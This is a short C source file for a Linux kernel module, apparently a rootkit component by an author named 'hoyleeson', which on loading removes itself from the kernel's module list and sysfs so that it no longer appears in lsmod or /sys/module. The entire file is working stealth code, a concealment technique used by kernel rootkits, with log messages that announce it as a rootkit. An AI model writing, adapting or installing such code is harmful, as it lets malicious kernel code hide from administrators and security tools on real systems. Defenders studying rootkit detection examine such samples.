#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/version.h>
#include <linux/kobject.h>
#include <linux/list.h>
#include <linux/proc_fs.h>


int kmod_hidden_init(void)
{
    struct module *m = &__this_module;
//    struct proc_dir_entry *my_dir_entry = proc_net->subdir;
    printk("Kernel rootkit init.\n");

    if (m->init == kmod_hidden_init)
    {
        list_del(&m->list);
        kobject_del(&m->mkobj.kobj); 
        list_del(&m->mkobj.kobj.entry);
        printk("Kernel rootkit has been hidden.\n");
    }

    return 0;
}

static void __exit kmod_hidden_exit(void)
{
    printk("Kernel rootkit release.\n");
}

module_init(kmod_hidden_init);
module_exit(kmod_hidden_exit);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("hoyleeson");
MODULE_VERSION("1.0.0");
MODULE_DESCRIPTION("hidden_kmod module");


